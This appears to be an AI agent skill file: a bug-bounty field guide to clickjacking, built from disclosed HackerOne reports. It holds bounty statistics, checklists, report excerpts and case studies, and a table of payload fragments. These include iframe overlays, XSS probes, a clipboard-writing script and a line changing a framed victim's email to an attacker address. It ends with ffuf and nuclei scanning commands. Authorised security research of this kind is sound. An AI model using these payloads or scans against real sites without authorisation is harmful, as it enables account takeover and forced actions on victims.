---
name: hackerone-clickjacking
description: >-
  Hunt clickjacking and UI redress. Use when testing sensitive actions and checking frame-ancestors/X-Frame-Options. Backed by 166 disclosed HackerOne reports.
---

# Clickjacking / UI Redressing — HackerOne field guide

Built from **166** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

## Signal

- Reports: **166** · paid: **12**
- Median bounty **$500** · p90 **$3,000** · max **$3,500** · total **$10,640**
- Median upvotes **5**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 3 | $3,500 | 295 |
| PortSwigger Web Security | 1 | $3,000 | 172 |
| X / xAI | 6 | $1,960 | 403 |
| TikTok | 2 | $1,000 | 35 |
| Mail.ru | 12 | $650 | 68 |
| Open-Xchange | 2 | $250 | 13 |
| pixiv | 1 | $200 | 70 |
| BOHEMIA INTERACTIVE a.s. | 1 | $80 | 22 |

## Quick wins

Start here. These are the highest-yield tests for this class.

- Check X-Frame-Options and CSP frame-ancestors on sensitive pages.
- Test settings, delete, payment, OAuth consent, and admin actions.
- Look for bypassable frame-busting.
- Build a minimal overlay and confirm the action executes.

## Payloads & probes

- `<iframe src=https://target/settings style="opacity:0.1">` + overlay button
- `frame-ancestors 'self'` missing -> any origin
- Double framing to bypass `X-Frame-Options: SAMEORIGIN`

## Bypass tricks

- Bypass JS frame-busting with sandbox or double framing.
- Use drag-and-drop / cursorjacking where needed.

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`settings` `delete` `payment` `oauth` `admin` `transfer`

## Tools

`Burp` · `clickjacking PoC generator` · `browser`

## Escalation chains

- Clickjacking -> CSRF-like action.
- Clickjacking -> OAuth consent.

## Deeper checklist

- Check `X-Frame-Options` and CSP `frame-ancestors` on sensitive pages.
- Test frames of settings, delete, payment, OAuth consent, and admin actions.
- Look for frame-busting that is bypassable or only client-side.
- Build a minimal overlay PoC and confirm the action executes when framed.
- Assess impact: which state change can a victim be tricked into?

## Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Cross-site Scripting (XSS) - Stored in RDoc wiki pages** — `#662287` · GitLab · $3,500 · ▲282
  > The `target` attribute could also be set to ` blank` and as there is no `rel="noopener"` [reverse tabnabbing](https://www.owasp.org/index.php/Reverse Tabnabbing) is also possible.
- **RCE of Burp  Scanner / Crawler via Clickjacking** — `#1274695` · PortSwigger Web Security · $3,000 · ▲172
  > Using the provided remote debugging APIs, it’s possible to trigger a file download to the `/Applications/Burp Suite Professional.app/Contents/` directory with a new `user.vmoptions` file.
- **Twitter Periscope Clickjacking Vulnerability** — `#591432` · X / xAI · $1,120 · ▲144
  > Put <iframe src="https://vulnerable.site" frameborder="0" </iframe
- **Highly wormable clickjacking in player card** — `#85624` · X / xAI · $0 · ▲134
  > https://twitter.com/AttackerCanvas/status/637859735501279232 ( Open with Safari or IE )
- **Clickjacking on donation page** — `#921709` · WordPress · $0 · ▲90
  > <center <h1 THIS PAGE IS VULNERABLE TO CLICKJACKING</h1
- **Clickjacking in main domain https://topechelon.com/** — `#2964441` · Top Echelon Software · $0 · ▲80
  > Create an HTML page embedding the target website using an `<iframe `.
- **clickjacing can lead to account takeover** — `#2119892` · pixiv · $200 · ▲70
  > using it we can trick the user to fake login with the use of clickjackingpoc : https://github.com/shifa123/clickjackingpoc
- **Viral Direct Message Clickjacking via link truncation leading to capture of both Google credentials & installation of malicious 3rd party Twitter App** — `#643274` · X / xAI · $0 · ▲64
  > https://api.twitter.com/oauth/authenticate?oauth token=yw71-wAAAAAA RbEAAABa-1kLgY
- **Double Clickjacking Attack on WakaTime OAuth Authorization Flow at https://wakatime.com/oauth/authorize** — `#3287060` · WakaTime · $0 · ▲57
  > In the source code in `index.html` on `const url=...`, simply change with your `client ID` and `redirect uri`.
- **Stealing User emails by clickjacking cards.twitter.com/xxx/xxx** — `#154963` · X / xAI · $0 · ▲49
  > https://twitter.com/i/cards/tfw/v1/759046372544741376?cardname=promotion&autoplay disabled=true&earned=true&lang=en&card height=357
- **[api.tumblr.com] Exploiting clickjacking vulnerability to trigger self DOM-based XSS** — `#953579` · Automattic · $0 · ▲32
  > And a self DOM-based XSS In https://api.tumblr.com/console/calls/user/(follow/unfollow)
- **Clickjacking at ylands.com** — `#405342` · BOHEMIA INTERACTIVE a.s. · $80 · ▲22
  > <iframe src="https://vigorgame.com/" height="550px" width="700px" </iframe
- **Clickjacking in the admin page** — `#728004` · Rocket.Chat · $0 · ▲21
  > The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame or <iframe .
- **Clickjacking on cas.acronis.com login page** — `#971234` · Acronis · $0 · ▲19
  > <iframe src="https://cas.acronis.com/" frameborder="0" height="700px" width="850px" </iframe
- **Improper markup sanitization.** — `#289823` · Automattic · $0 · ▲19
  > I have published the note so that you can verify the issue: https://app.simplenote.com/p/th9BPG.
- **RTLO char allowed in chat** — `#196222` · Snapchat · $0 · ▲18
  > I can send messages like "Hey check out my new song at example.com/song[rtlo]3pm.exe" and everyone would see the link as "example.com/songexe.mp3".
- **CRITICAL-CLICKJACKING at Yelp Reservations Resulting in exposure of victim Private Data (Email info) + Victim Credit Card MissUse.** — `#355859` · Yelp · $0 · ▲18
  > https://www.linkedin.com/pulse/20141202104842-120953718-why-am-i-anxious-about-clickjacking/
- **Clickjacking in [exchangemarketplace.com]** — `#658217` · Shopify · $0 · ▲17
  > X-Frame-Options ALLOW-FROM https://exchangemarketplace.com not supported by several Browser, this caused Clickjacking on https://exchangemarketplace.com
- **self-xss with ClickJacking can leads to account takeover in Firefox** — `#892289` · Imgur · $0 · ▲17
  > `<<!<script iframe src=javajavascriptscript:alert(document.domain) `
- **Clickjacking at open.rocket.chat** — `#1584034` · Rocket.Chat · $0 · ▲16
  > However, we would like to clarify that we no longer accept vulnerability reports pertaining to our clients or community instances, such as https://open.rocket.chat or https://{customer}.rocket.chat.
- **Prepopulation of email address and name leaks information provided to other merchants** — `#316290` · Coinbase · $0 · ▲16
  > Thus, an attacker can set up a malicious website that frames the widget with 0 opacity, and the widget will be prepopulated when a victim that has previously entered name / email in the widget on another page navigates to the attacking page.
- **Improper markup sanitisation in Simplenote Android application.** — `#297547` · Automattic · $0 · ▲16
  > The Simplenote Android application (1.5.6) still allows users to embed fully-fledged forms.
- **OAuth authorization page vulnerable to clickjacking** — `#65825` · Coinbase · $0 · ▲16
  > The bug was fixed by ensuring our OAuth-related responses included the same security headers (including X-Frame-Options) as the rest of the site.
- **Crafted frame injection leading to form-based UI redressing.** — `#291683` · Automattic · $0 · ▲14
  > Since Simplenote is built on Electron I would imagine it should be easy to implement a [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) and you should be able to set the `frame-src` directive to `none`.
- **Clickjacking wordcamp.org** — `#230581` · WordPress · $0 · ▲14
  > <iframe src="https://www.blockchain.com/" frameborder="2 px" height="500px" width="500px" </iframe
- **Reflected XSS through ClickJacking** — `#1171403` · U.S. Dept Of Defense · $0 · ▲14
  > i found an reflected XSS that require user interaction, but it's suspicious due the reflected payload in the page
- **Clickjacking Vulnerability found on Yelp** — `#214087` · Yelp · $0 · ▲13
  > No.4 trick user to edit review withyelp transparent = shows the vulnerability happening, while the user cannot see the yelp page.
- **URL is vulnerable to clickjacking** — `#712376` · MyCrypto · $0 · ▲12
  > https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Clickjacking Defense Cheat Sheet.md
- **Following links are vulnerable to clickjacking** — `#289246` · Semrush · $0 · ▲12
  > <frame src="https://www.semrush.com/ranking-factors/"
- **Clickjacking mercantile.wordpress.org** — `#264125` · WordPress · $0 · ▲12
  > Reference: http://blogs.msdn.com/b/ieinternals/archive/2010/03/30/combating-clickjacking-with-x-frame-options.aspx

## Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 1× | `{ / <a href='https://aw.rs/users/signin' class='atwho-view select2-drop-mask pika-select'> / <img height=10000 width=10000></a> / }[a]` |
| 1× | `<div class="md md-file"> / <p>Full Page link</p> / <p><a href="a" rel="nofollow"></a><a href="https://aw.rs/users/signin" class="atwho-view` |
| 1× | `{<img src>}[link]` |
| 1× | `<iframe src="//twitter.com"></iframe>` |
| 1× | `<iframe>` |
| 1× | `<html> / <iframe src=https://twitter.com/i/cards/tfw/v1/759046372544741376?cardname=promotion&autoplay_disabled=true&earned=true&lang=en&car` |
| 1× | `line 1309 : n.html('"<u>' + t + '</u>"')` |
| 1× | `https://www.<img src=x onerror='alert()'>` |
| 1× | `<iframe src=http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540></iframe>` |
| 1× | `<iframe id=ifr></iframe> / <script> / ifr.onload=function(){ / console.log(ifr.contentWindow.frames.length); / } / </script>` |
| 1× | `<script> / setInterval(function(){ / / navigator.clipboard.writeText("PAYLOAD").then(function(text){console.log(text)}); / },1000) / </scrip` |
| 1× | `<<!<script>iframe src=javajavascriptscript:alert(document.domain)>` |
| 1× | `navigator.clipboard.writeText()` |
| 1× | `<html> / <title>Clickjacking</title> / <body> / <iframe src="https://refer.wordpress.com/affiliate-network/campaign-settings/"></iframe> / <` |
| 1× | `<iframe src="https://sso.semrush.com/"></iframe>` |
| 1× | `https://█████/████&url=http%3a%2f%2fgalnagli.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E` |
| 1× | `<img src=x onerror=alert(1)>` |
| 1× | `MyIFrameDoc.document.getElementById("your-profile").email.value="attacker_rewanthcool@gmail.com` |
| 1× | `https://gitlab.com@example.com` |
| 1× | `@gronke` |

## Parameters observed

`oauth_token` · `id` · `subcat` · `previous_url` · `hl` · `sl` · `tl` · `Bi06UejC9N` · `continue` · `client_id` · `response_type` · `redirect_uri` · `cardname` · `autoplay_disabled` · `earned` · `lang` · `card_height` · `message` · `userid` · `depth`

## Case studies

### Cross-site Scripting (XSS) - Stored in RDoc wiki pages
`#662287` · GitLab · $3,500 · high · 2019-12-16 · ▲282
> When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanitized, when creating a linkable image of the format { }[link] For example it is possible to specify a class attribute when creating an image link: will generate the following: This will place a link taking over the entire page and intercept any clicks, atwho-view select2-drop-mask pika-select are just some real classes that make the links…

### RCE of Burp  Scanner / Crawler via Clickjacking
`#1274695` · PortSwigger Web Security · $3,000 · high · 2023-10-10 · ▲172
> Burp Suite utilizes an embedded Chrome browser for crawling and scanning web applications. The Chrome instance is launched in headless mode, with remote debugging enabled via the remote-debugging websocket port instead of remote-debugging-pipe. As a result, a known XSS vulnerability in Chrome can be leveraged in combination with a JavaScript port sniffing and ClickJacking attack to compromise the WebSocket GUID for the remote debugging channel.

### Twitter Periscope Clickjacking Vulnerability
`#591432` · X / xAI · $1,120 · medium · 2019-07-10 · ▲144
> X-Frame-Options ALLOW-FROM https://twitter.com/ not supported by several Browser, this caused Clickjacking on Twitter Periscope subdomain (https://canary-web.pscp.tv & https://canary-web.periscope.tv)

### Highly wormable clickjacking in player card
`#85624` · X / xAI · $0 · n/a · 2018-05-17 · ▲134
> Twitter Player Card allows a website to embed a custom player(html) into an iframe in a tweet. There are currently 2-3 security features in place to defend clickjacking on Twitter: 1. covering the whole twitter.com domain 2. ditto 3. JS-based frame-buster in some pages (but not all) For (1), SAMEORIGIN only checks if the embedded frame is on the same origin of the top window.

### Clickjacking on donation page
`#921709` · WordPress · $0 · low · 2020-07-16 · ▲90
> Vulnerable URL: https://wordpressfoundation.org/donate/ Clickjacking on the vulnerable URL allows an attacker to redirect a victim to do a donation at an attacker's page.

## Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_clickjacking.txt` | 98 |
| `~/.local/share/hackerone-reports/wordlists/params_clickjacking.txt` | 48 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_clickjacking.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_clickjacking.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

## Nuclei

Scanner hits are only a signal; build a framed PoC on a sensitive action and confirm it executes.

```sh
nuclei -u https://target -tags clickjacking,headers \
       -severity low,medium,high,critical -rl 40 -o nuclei_clickjacking.txt
nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \
       -rl 40 -o nuclei_clickjacking_misconfiguration.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class clickjacking --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class clickjacking
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class clickjacking
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class clickjacking --min-bounty 1000
```

## Related

- `hackerone-csrf` (541 reports)
- `hackerone-xss` (2,569 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.
